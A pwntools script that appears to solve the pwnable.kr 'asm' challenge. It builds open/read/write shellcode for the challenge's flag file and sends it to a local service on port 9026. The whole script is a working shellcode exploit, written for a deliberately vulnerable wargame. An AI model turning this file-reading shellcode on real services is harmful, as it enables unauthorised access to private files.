from pwn import *

context.binary = "/home/asm/asm"

file_name_str = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

length_int = 1000

shellcode = asm(
        shellcraft.open(file_name_str) +
        shellcraft.read(3, "rsp", length_int) +
        shellcraft.write(1, "rsp", length_int) +
        shellcraft.exit(0)
)

p = remote('0', 9026)

print(p.recv())
p.sendline(shellcode)
print(p.recv())
print(p.recv())

